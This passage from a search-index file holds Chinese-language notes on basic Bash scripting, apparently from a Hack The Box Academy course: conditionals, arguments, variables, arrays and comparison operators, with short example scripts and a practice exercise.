perl\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#if-else-fi","title":"If-Else-Fi","text":"<p>\u6700\u57fa\u672c\u7684\u7f16\u7a0b\u4efb\u52a1\u4e4b\u4e00\u662f\u68c0\u67e5\u4e0d\u540c\u7684\u6761\u4ef6\u6765\u5904\u7406\u8fd9\u4e9b\u95ee\u9898\u3002\u6761\u4ef6\u68c0\u67e5\u5728\u7f16\u7a0b\u8bed\u8a00\u548c\u811a\u672c\u8bed\u8a00\u4e2d\u901a\u5e38\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u5f62\u5f0f\uff0c<code>if-else condition</code>\u5373<code>case statements</code>\u3002\u5728\u4f2a\u4ee3\u7801\u4e2d\uff0cif \u6761\u4ef6\u7684\u542b\u4e49\u5982\u4e0b\uff1a</p> <pre><code>if [ the number of given arguments equals 0 ]\nthen\n    Print: \"You need to specify the target domain.\"\n    Print: \"&lt;empty line&gt;\"\n    Print: \"Usage:\"\n    Print: \"   &lt;name of the script&gt; &lt;domain&gt;\"\n    Exit the script with an error\nelse\n    The \"domain\" variable serves as the alias for the given argument \nfinish the if-condition\n</code></pre> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a<code>If-Else</code>\u6761\u4ef6\u53ea\u80fd\u5305\u542b\u4e00\u4e2a\u201c\u00a0<code>If</code>\u201d\uff0c\u5982\u4e0b\u4e00\u4e2a\u793a\u4f8b\u6240\u793a\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#if-onlysh","title":"If-Only.sh","text":"<pre><code>#!/bin/bash\n\nvalue=$1\n\nif [ $value -gt \"10\" ]\nthen\n        echo \"Given argument is greater than 10.\"\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#if-onlysh-","title":"If-Only.sh - \u6267\u884c","text":"<pre><code>$ bash if-only.sh 5\n\n$ bash if-only.sh 12\n\nGiven argument is greater than 10.\n</code></pre> <p>\u6dfb\u52a0<code>Elif</code>or<code>Else</code>\u65f6\uff0c\u6211\u4eec\u6dfb\u52a0\u66ff\u4ee3\u9879\u6765\u5904\u7406\u7279\u5b9a\u503c\u6216\u72b6\u6001\u3002\u5982\u679c\u7279\u5b9a\u503c\u4e0d\u9002\u7528\u4e8e\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u5b83\u5c06\u88ab\u5176\u4ed6\u60c5\u51b5\u6355\u83b7\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#if-elif-elsesh","title":"If-Elif-Else.sh","text":"<pre><code>#!/bin/bash\n\nvalue=$1\n\nif [ $value -gt \"10\" ]\nthen\n    echo \"Given argument is greater than 10.\"\nelif [ $value -lt \"10\" ]\nthen\n    echo \"Given argument is less than 10.\"\nelse\n    echo \"Given argument is not a number.\"\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#if-elif-elsesh-","title":"If-Elif-Else.sh - \u6267\u884c","text":"<pre><code>$ bash if-elif-else.sh 5\n\nGiven argument is less than 10.\n\n$ bash if-elif-else.sh 12\n\nGiven argument is greater than 10.\n\n$ bash if-elif-else.sh HTB\n\nif-elif-else.sh: line 5: [: HTB: integer expression expected\nif-elif-else.sh: line 8: [: HTB: integer expression expected\nGiven argument is not a number.\n\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u6269\u5c55\u6211\u4eec\u7684\u811a\u672c\u5e76\u6307\u5b9a\u51e0\u4e2a\u6761\u4ef6(Several Conditions)\u3002\u8fd9\u53ef\u80fd\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#several-conditions-scriptsh","title":"Several Conditions - Script.sh","text":"<pre><code>#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelif [ $# -eq 1 ]\nthen\n    domain=$1\nelse\n    echo -e \"Too many arguments given.\"\n    exit 1\nfi\n\n&lt;SNIP&gt;\n</code></pre> <p>\u5b9a\u4e49\u4e86\u53e6\u4e00\u4e2a\u6761\u4ef6(\u00a0<code>elif [&lt;condition&gt;];then</code>)\uff0c\u5b83\u6253\u5370\u4e00\u884c\uff0c\u544a\u8bc9\u6211\u4eec(<code>echo -e \"...\"</code>)\u3002\u6211\u4eec\u7ed9\u51fa\u4e86\u591a\u4e2a\u53c2\u6570\uff0c\u5e76\u4ee5\u9519\u8bef\u9000\u51fa\u7a0b\u5e8f(<code>exit 1</code>)</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#exercise-script","title":"Exercise Script","text":"<pre><code>#!/bin/bash\n# Count number of characters in a variable:\n#     echo $variable | wc -c\n\n# Variable to encode\nvar=\"nef892na9s1p9asn2aJs71nIsm\"\n\nfor counter in {1..40}\ndo\n        var=$(echo $var | base64)\ndone\n#Create an \"If-Else\" condition in the \"For\"-Loop of the \"Exercise Script\" that prints you the number of characters of the 35th generated value of the variable \"var\". Submit the number as the answer.\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#-","title":"------","text":""},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_2","title":"\u53c2\u6570\u3001\u53d8\u91cf\u548c\u6570\u7ec4","text":""},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#arguments","title":"Arguments","text":"<p>bash \u811a\u672c\u7684\u4f18\u70b9\u662f\u6211\u4eec\u59cb\u7ec8\u53ef\u4ee5\u5c06\u6700\u591a 9 \u4e2a\u53c2\u6570 (\u00a0<code>$0</code>-\u00a0<code>$9</code>) \u4f20\u9012\u7ed9\u811a\u672c\uff0c\u800c\u65e0\u9700\u5c06\u5b83\u4eec\u5206\u914d\u7ed9\u53d8\u91cf\u6216\u4e3a\u8fd9\u4e9b\u53d8\u91cf\u8bbe\u7f6e\u76f8\u5e94\u7684\u8981\u6c42\u3002<code>9 arguments</code>\u56e0\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570 <code>$0</code> \u662f\u4e3a\u811a\u672c\u4fdd\u7559\u7684\u3002\u6b63\u5982\u6211\u4eec\u5728\u6b64\u5904\u770b\u5230\u7684\uff0c\u6211\u4eec\u9700\u8981\u5728 <code>$</code> \u53d8\u91cf\u540d\u79f0\u524d\u52a0\u4e0a\u7f8e\u5143\u7b26\u53f7 ( ) \u624d\u80fd\u5728\u6307\u5b9a\u4f4d\u7f6e\u4f7f\u7528\u5b83\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u5206\u914d\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a</p> <pre><code>$ ./script.sh ARG1 ARG2 ARG3 ... ARG9\n       ASSIGNMENTS:       $0      $1   $2   $3 ...   $9\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5df2\u7ecf\u81ea\u52a8\u5c06\u76f8\u5e94\u7684\u53c2\u6570\u5206\u914d\u7ed9\u8fd9\u4e2a\u5730\u65b9\u7684\u9884\u5b9a\u4e49\u53d8\u91cf\u3002\u8fd9\u4e9b\u53d8\u91cf\u79f0\u4e3a\u7279\u6b8a\u53d8\u91cf\u3002\u8fd9\u4e9b\u7279\u6b8a\u53d8\u91cf\u7528\u4f5c\u5360\u4f4d\u7b26\u3002\u5982\u679c\u6211\u4eec\u73b0\u5728\u518d\u6b21\u67e5\u770b\u4ee3\u7801\u90e8\u5206\uff0c\u6211\u4eec\u5c06\u770b\u5230\u5728\u54ea\u91cc\u4f7f\u7528\u4e86\u54ea\u4e9b\u53c2\u6570\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#cidrsh","title":"CIDR.sh","text":"<pre><code>#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n\n&lt;SNIP&gt;\n</code></pre> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6267\u884c\u6211\u4eec\u7684\u811a\u672c\u3002\u4f46\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5148\u8bbe\u7f6e\u811a\u672c\u7684\u6267\u884c\u6743\u9650\uff0c\u7136\u540e\u624d\u80fd\u4f7f\u7528\u5176\u4e2d\u5b9a\u4e49\u7684\u89e3\u91ca\u5668\u6267\u884c\u5b83\u3002</p> <pre><code>$ chmod +x cidr.sh\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#cidrsh-","title":"CIDR.sh - \u65e0\u53c2\u6570\u6267\u884c","text":"<pre><code>./cidr.sh\n\nYou need to specify the target domain.\n\nUsage:\n    cidr.sh &lt;domain&gt;\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#cidrsh-_1","title":"CIDR.sh - \u6ca1\u6709\u6267\u884c\u6743\u9650\u7684\u6267\u884c","text":"<pre><code>$ bash cidr.sh\n\nYou need to specify the target domain.\n\nUsage:\n    cidr.sh &lt;domain&gt;\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_3","title":"\u7279\u6b8a\u53d8\u91cf","text":"<p>\u7279\u6b8a\u53d8\u91cf\u4f7f\u7528\u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26(\u00a0<code>IFS</code>) \u6765\u8bc6\u522b\u53c2\u6570\u4f55\u65f6\u7ed3\u675f\u4ee5\u53ca\u4e0b\u4e00\u4e2a\u53c2\u6570\u4f55\u65f6\u5f00\u59cb\u3002Bash \u63d0\u4f9b\u4e86\u5404\u79cd\u7279\u6b8a\u53d8\u91cf\u6765\u5e2e\u52a9\u7f16\u5199\u811a\u672c\u3002\u5176\u4e2d\u4e00\u4e9b\u53d8\u91cf\u662f\uff1a IFS | \u63cf\u8ff0 --- | --- <code>$#</code> | \u6b64\u53d8\u91cf\u4fdd\u5b58\u4f20\u9012\u7ed9\u811a\u672c\u7684\u53c2\u6570\u6570\u91cf\u3002 <code>$@</code> | \u6b64\u53d8\u91cf\u53ef\u7528\u4e8e\u68c0\u7d22\u547d\u4ee4\u884c\u53c2\u6570\u5217\u8868\u3002 <code>$n</code> | \u6bcf\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\u90fd\u53ef\u4ee5\u4f7f\u7528\u5176\u4f4d\u7f6e\u6709\u9009\u62e9\u5730\u68c0\u7d22\u3002\u4f8b\u5982\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8e<code>$1</code>\u3002 <code>$$</code> | \u5f53\u524d\u6267\u884c\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID\u3002 <code>$?</code> | \u811a\u672c\u7684\u9000\u51fa\u72b6\u6001\u3002\u6b64\u53d8\u91cf\u5bf9\u4e8e\u786e\u5b9a\u547d\u4ee4\u662f\u5426\u6210\u529f\u5f88\u6709\u7528\u3002\u503c 0 \u8868\u793a\u6210\u529f\u6267\u884c\uff0c\u800c 1 \u8868\u793a\u5931\u8d25\u7684\u7ed3\u679c\u3002 \u5728\u4e0a\u9762\u663e\u793a\u7684\u53d8\u91cf\u4e2d\uff0c\u6211\u4eec\u7684<code>if-else</code>\u6761\u4ef6\u4e2d\u6709 3 \u4e2a\u8fd9\u6837\u7684\u7279\u6b8a\u53d8\u91cf\u3002 IFS | \u63cf\u8ff0 --- | --- <code>$#</code> | \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e00\u4e2a\u9700\u8981\u5206\u914d\u7ed9\u53d8\u91cf\u7684<code>domain</code>\u53d8\u91cf\u3002\u6b64\u53d8\u91cf\u7528\u4e8e\u6307\u5b9a\u6211\u4eec\u8981\u4f7f\u7528\u7684\u76ee\u6807\u3002\u5982\u679c\u6211\u4eec\u53ea\u63d0\u4f9b\u4e00\u4e2a FQDN \u4f5c\u4e3a\u53c2\u6570\uff0c\u5219\u8be5<code>$#</code>\u53d8\u91cf\u7684\u503c\u4e3a<code>1</code>. <code>$0</code> | \u8fd9\u4e2a\u7279\u6b8a\u53d8\u91cf\u88ab\u5206\u914d\u4e86\u6267\u884c\u811a\u672c\u7684\u540d\u79f0\uff0c\u7136\u540e\u5728\u201c\u00a0<code>Usage:</code>\u201d\u793a\u4f8b\u4e2d\u663e\u793a\u3002 <code>$1</code> | \u7b2c\u4e00\u4e2a\u53c2\u6570\u7531\u7a7a\u683c\u5206\u9694\uff0c\u5206\u914d\u7ed9\u8be5\u7279\u6b8a\u53d8\u91cf\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_4","title":"\u53d8\u91cf","text":"<p>\u6211\u4eec\u8fd8\u770b\u5230\uff0c\u5728 if-else \u5faa\u73af\u7684\u672b\u5c3e\uff0c\u6211\u4eec\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u8d4b\u7ed9\u4e86\u540d\u4e3a\u201c\u00a0<code>domain</code>\u201d\u7684\u53d8\u91cf\u3002\u53d8\u91cf\u7684\u8d4b\u503c\u6ca1\u6709\u7f8e\u5143\u7b26\u53f7 (\u00a0<code>$</code>)\u3002\u7f8e\u5143\u7b26\u53f7\u4ec5\u7528\u4e8e\u5141\u8bb8\u5728\u5176\u4ed6\u4ee3\u7801\u6bb5\u4e2d\u4f7f\u7528\u6b64\u53d8\u91cf\u7684\u5bf9\u5e94\u503c\u3002\u5206\u914d\u53d8\u91cf\u65f6\uff0c\u540d\u79f0\u548c\u503c\u4e4b\u95f4\u4e0d\u80fd\u6709\u7a7a\u683c\u3002</p> <pre><code>&lt;SNIP&gt;\nelse\n    domain=$1\nfi\n&lt;SNIP&gt;\n</code></pre> <p>\u4e0e\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e0d\u540c\uff0cBash\u4e2d\u7684\u53d8\u91cf\u7c7b\u578b\uff08\u5982\u201c<code>strings</code>\u201d\u3001\u201c<code>integers</code>\u201d\u548c\u201c<code>boolean</code>\u201d\uff09\u4e4b\u95f4\u6ca1\u6709\u76f4\u63a5\u7684\u533a\u522b\u548c\u8bc6\u522b\u3002\u53d8\u91cf\u7684\u6240\u6709\u5185\u5bb9\u90fd\u88ab\u89c6\u4e3a\u5b57\u7b26\u4e32\u5b57\u7b26\u3002Bash\u6839\u636e\u662f\u5426\u53ea\u5206\u914d\u6570\u5b57\u6765\u542f\u7528\u7b97\u672f\u51fd\u6570\u3002\u58f0\u660e\u53d8\u91cf\u65f6\u5fc5\u987b\u6ce8\u610f\uff0c\u5b83\u4eec<code>not</code>\u5305\u542b<code>space</code>\u3002\u5426\u5219\uff0c\u5b9e\u9645\u53d8\u91cf\u540d\u5c06\u88ab\u89e3\u91ca\u4e3a\u5185\u90e8\u51fd\u6570\u6216\u547d\u4ee4\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#-_1","title":"\u58f0\u660e\u53d8\u91cf - \u9519\u8bef","text":"<pre><code>$ variable = \"this will result with an error.\"\n\ncommand not found: variable\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#-_2","title":"\u58f0\u660e\u53d8\u91cf - \u6ca1\u6709\u9519\u8bef","text":"<pre><code>$ variable=\"Declared without an error.\"\n$ echo $variable\n\nDeclared without an error.\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_5","title":"\u6570\u7ec4","text":"<p>\u5728Bash\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u4e3a\u5355\u4e2a\u53d8\u91cf\u5206\u914d\u591a\u4e2a\u503c\u3002\u5982\u679c\u6211\u4eec\u60f3\u626b\u63cf\u591a\u4e2a\u57df\u6216IP\u5730\u5740\uff0c\u8fd9\u53ef\u80fd\u662f\u6709\u76ca\u7684\u3002\u8fd9\u4e9b\u53d8\u91cf\u79f0\u4e3a <code>arrays</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u548c\u5904\u7406\u7279\u5b9a\u7c7b\u578b\u503c\u7684\u6709\u5e8f\u5e8f\u5217\u3002\u6570\u7ec4\u7528\u4ee5 <code>0</code> \u5f00\u5934\u7684\u7d22\u5f15\u6807\u8bc6\u6bcf\u4e2a\u5b58\u50a8\u9879\u3002\u5f53\u6211\u4eec\u60f3\u7ed9\u6570\u7ec4\u7ec4\u4ef6\u8d4b\u503c\u65f6\uff0c\u6211\u4eec\u7528\u4e0e\u6807\u51c6shell\u53d8\u91cf\u76f8\u540c\u7684\u65b9\u6cd5\u8fdb\u884c\u3002\u6211\u4eec\u6240\u505a\u7684\u5c31\u662f\u6307\u5b9a\u65b9\u62ec\u53f7\u4e2d\u7684\u5b57\u6bb5\u7d22\u5f15\u3002\u6570\u7ec4\u7684\u58f0\u660e\u5728Bash\u4e2d\u5982\u4e0b\u6240\u793a\uff1a</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#arrayssh","title":"Arrays.sh","text":"<pre><code>#!/bin/bash\n\ndomains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)\n\necho ${domains[0]}\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5e26\u6709\u5927\u62ec\u53f7\u4e2d\u76f8\u5e94\u7d22\u5f15\u7684\u53d8\u91cf\u7684\u7d22\u5f15\u6765\u5355\u72ec\u68c0\u7d22\u5b83\u4eec\u3002\u82b1\u62ec\u53f7\u7528\u4e8e\u53d8\u91cf\u6269\u5c55\u3002</p> <pre><code>$ ./Arrays.sh\n\nwww.inlanefreight.com\n</code></pre> <p>\u8bf7\u52a1\u5fc5\u6ce8\u610f\uff0c\u5355\u5f15\u53f7 (\u00a0<code>'</code>...\u00a0<code>'</code>) \u548c\u53cc\u5f15\u53f7 (\u00a0<code>\"</code>...\u00a0<code>\"</code>) \u53ef\u9632\u6b62\u6570\u7ec4\u4e2d\u7684\u5404\u4e2a\u503c\u88ab\u7a7a\u683c\u5206\u9694\u3002\u8fd9\u610f\u5473\u7740\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u4e4b\u95f4\u7684\u6240\u6709\u7a7a\u683c\u90fd\u5c06\u88ab\u5ffd\u7565\u5e76\u4f5c\u4e3a\u5206\u914d\u7ed9\u6570\u7ec4\u7684\u5355\u4e2a\u503c\u5904\u7406\u3002</p> <pre><code>#!/bin/bash\n\ndomains=(\"www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com\" www2.inlanefreight.com)\necho ${domains[0]}\n</code></pre> <pre><code>$ ./Arrays.sh\n\nwww.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com\n</code></pre> <p>------ \u00a0## \u6bd4\u8f83\u8fd0\u7b97\u7b26 \u00a0\u8981\u76f8\u4e92\u6bd4\u8f83\u7279\u5b9a\u503c\uff0c\u6211\u4eec\u9700\u8981\u79f0\u4e3a\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684\u5143\u7d20\u3002<code>comparison operators</code>\u7528\u4e8e\u786e\u5b9a\u5982\u4f55\u6bd4\u8f83\u5b9a\u4e49\u7684\u503c\u3002\u5bf9\u4e8e\u8fd9\u4e9b\u8fd0\u7b97\u7b26\uff0c\u6211\u4eec\u533a\u5206\uff1a \u00a0-   <code>string</code>\u00a0operators -   <code>integer</code>\u00a0operators -   <code>file</code>\u00a0operators -   <code>boolean</code>\u00a0operators</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_6","title":"\u5b57\u7b26\u4e32\u8fd0\u7b97\u7b26","text":"<p>\u5982\u679c\u6211\u4eec\u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u77e5\u9053\u6211\u4eec\u5e0c\u671b\u5728\u76f8\u5e94\u7684\u503c\u4e2d\u6709\u4ec0\u4e48\u3002 Operator | \u63cf\u8ff0 --- | --- <code>==</code> | \u7b49\u4e8e <code>!=</code> | \u4e0d\u7b49\u4e8e <code>&lt;</code> | \u5c0f\u4e8e\u6309 ASCII \u5b57\u6bcd\u987a\u5e8f <code>&gt;</code> | \u5927\u4e8e\u6309 ASCII \u5b57\u6bcd\u987a\u5e8f\u6392\u5217 <code>-z</code> | \u5982\u679c\u5b57\u7b26\u4e32\u4e3a\u7a7a\uff08null\uff09 <code>-n</code> | \u5982\u679c\u5b57\u7b26\u4e32\u4e0d\u4e3a\u7a7a \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5c06\u7ed9\u5b9a\u53c2\u6570 (\u00a0<code>$1</code>) \u7684\u53d8\u91cf\u653e\u5728\u53cc\u5f15\u53f7 (\u00a0<code>\"$1\"</code>) \u4e2d\u3002\u8fd9\u544a\u8bc9 Bash \u53d8\u91cf\u7684\u5185\u5bb9\u5e94\u8be5\u4f5c\u4e3a\u5b57\u7b26\u4e32\u5904\u7406\u3002\u5426\u5219\uff0c\u6211\u4eec\u4f1a\u5f97\u5230\u4e00\u4e2a\u9519\u8bef\u3002</p> <pre><code>#!/bin/bash\n\n# Check the given argument\nif [ \"$1\" != \"HackTheBox\" ]\nthen\n    echo -e \"You need to give 'HackTheBox' as argument.\"\n    exit 1\n\nelif [ $# -gt 1 ]\nthen\n    echo -e \"Too many arguments given.\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Success!\"\nfi\n</code></pre> <p>\u5b57\u7b26\u4e32\u6bd4\u8f83\u8fd0\u7b97\u7b26\u201c\u00a0<code>&lt;</code>/\u00a0<code>&gt;</code>\u201d\u4ec5\u5728\u53cc\u65b9\u62ec\u53f7\u5185\u6709\u6548<code>[[ &lt;condition&gt; ]]</code>\u3002\u6211\u4eec\u53ef\u4ee5\u5728 Internet \u4e0a\u627e\u5230 ASCII \u8868\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002\u6211\u4eec\u7a0d\u540e\u770b\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>$ man ascii\n</code></pre> <p><code>ASCII</code>\u4ee3\u8868<code>American Standard Code for Information Interchange</code>\u5e76\u8868\u793a 7 \u4f4d\u5b57\u7b26\u7f16\u7801\u3002\u7531\u4e8e\u6bcf\u4e2a\u4f4d\u53ef\u4ee5\u53d6\u4e24\u4e2a\u503c\uff0c\u56e0\u6b64\u6709<code>128</code>\u4e0d\u540c\u7684\u4f4d\u6a21\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u89e3\u91ca\u4e3a\u5341\u8fdb\u5236\u6574\u6570<code>0</code>-<code>127</code>\u6216\u5341\u516d\u8fdb\u5236\u503c<code>00</code>-\u00a0<code>7F</code>\u3002\u524d 32 \u4e2a ASCII \u5b57\u7b26\u4ee3\u7801\u4fdd\u7559\u4e3a\u6240\u8c13\u7684\u63a7\u5236\u5b57\u7b26\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_7","title":"\u6574\u6570\u8fd0\u7b97\u7b26","text":"<p>\u5982\u679c\u6211\u4eec\u77e5\u9053\u8981\u6bd4\u8f83\u7684\u503c\uff0c\u6bd4\u8f83\u6574\u6570\u5bf9\u6211\u4eec\u975e\u5e38\u6709\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5b9a\u4e49\u63a5\u4e0b\u6765\u7684\u6b65\u9aa4\u548c\u547d\u4ee4\u811a\u672c\u5e94\u8be5\u5982\u4f55\u5904\u7406\u76f8\u5e94\u7684\u503c\u3002 Operator | \u63cf\u8ff0 --- | --- <code>-eq</code> | \u7b49\u4e8e <code>-ne</code> | \u4e0d\u7b49\u4e8e <code>-lt</code> | \u5c0f\u4e8e <code>-le</code> | \u5c0f\u4e8e\u6216\u7b49\u4e8e <code>-gt</code> | \u5927\u4e8e <code>-ge</code> | \u5927\u4e8e\u6216\u7b49\u4e8e</p> <pre><code>#!/bin/bash\n\n# Check the given argument\nif [ $# -lt 1 ]\nthen\n    echo -e \"Number of given arguments is less than 1\"\n    exit 1\n\nelif [ $# -gt 1 ]\nthen\n    echo -e \"Number of given arguments is greater than 1\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Number of given arguments equals 1\"\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_8","title":"\u6587\u4ef6\u8fd0\u7b97\u7b26","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u627e\u51fa\u7279\u5b9a\u7684\u6743\u9650\u6216\u8005\u5b83\u4eec\u662f\u5426\u5b58\u5728\uff0c\u6587\u4ef6\u64cd\u4f5c\u7b26\u5f88\u6709\u7528\u3002 Operator | \u63cf\u8ff0 --- | --- <code>-e</code> | \u5982\u679c\u6587\u4ef6\u5b58\u5728 <code>-f</code> | \u6d4b\u8bd5\u5b83\u662f\u5426\u662f\u4e00\u4e2a\u6587\u4ef6 <code>-d</code> | \u6d4b\u8bd5\u5b83\u662f\u5426\u662f\u4e00\u4e2a\u76ee\u5f55 <code>-L</code> | \u6d4b\u8bd5\u662f\u5426\u662f\u7b26\u53f7\u94fe\u63a5 <code>-N</code> | \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5728\u4e0a\u6b21\u8bfb\u53d6\u540e\u88ab\u4fee\u6539 <code>-O</code> | \u5982\u679c\u5f53\u524d\u7528\u6237\u62e5\u6709\u8be5\u6587\u4ef6 <code>-G</code> | \u5982\u679c\u6587\u4ef6\u7684\u7ec4 id \u5339\u914d\u5f53\u524d\u7528\u6237\u7684 <code>-s</code> | \u6d4b\u8bd5\u6587\u4ef6\u7684\u5927\u5c0f\u662f\u5426\u5927\u4e8e 0 <code>-r</code> | \u6d4b\u8bd5\u6587\u4ef6\u662f\u5426\u5177\u6709\u8bfb\u53d6\u6743\u9650 <code>-w</code> | \u6d4b\u8bd5\u6587\u4ef6\u662f\u5426\u6709\u5199\u6743\u9650 <code>-x</code> | \u6d4b\u8bd5\u6587\u4ef6\u662f\u5426\u6709\u6267\u884c\u6743\u9650</p> <pre><code>#!/bin/bash\n\n# Check if the specified file exists\nif [ -e \"$1\" ]\nthen\n    echo -e \"The file exists.\"\n    exit 0\n\nelse\n    echo -e \"The file does not exist.\"\n    exit 2\nfi\n</code></pre>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_9","title":"\u5e03\u5c14\u548c\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<p>\u6211\u4eec\u5f97\u5230\u4e00\u4e2a\u5e03\u5c14\u503c\u201c\u00a0<code>false</code>\u201d\u6216\u201c\u00a0<code>true</code>\u201d\u4f5c\u4e3a\u903b\u8f91\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\u3002Bash \u8ba9\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53cc\u65b9\u62ec\u53f7\u6765\u6bd4\u8f83\u5b57\u7b26\u4e32<code>[[\u00a0&lt;condition&gt; ]]</code>\u3002\u8981\u83b7\u53d6\u8fd9\u4e9b\u5e03\u5c14\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32\u8fd0\u7b97\u7b26\u3002\u65e0\u8bba\u6bd4\u8f83\u662f\u5426\u5339\u914d\uff0c\u6211\u4eec\u90fd\u4f1a\u5f97\u5230\u5e03\u5c14\u503c\u201c\u00a0<code>false</code>\u201d\u6216\u201c\u00a0<code>true</code>\u201d\u3002</p> <pre><code>#!/bin/bash\n\n# Check the boolean value\nif [[ -z $1 ]]\nthen\n    echo -e \"Boolean value: True (is null)\"\n    exit 1\n\nelif [[ $# &gt; 1 ]]\nthen\n    echo -e \"Boolean value: True (is greater than)\"\n    exit 1\n\nelse\n    domain=$1\n    echo -e \"Boolean value: False (is equal 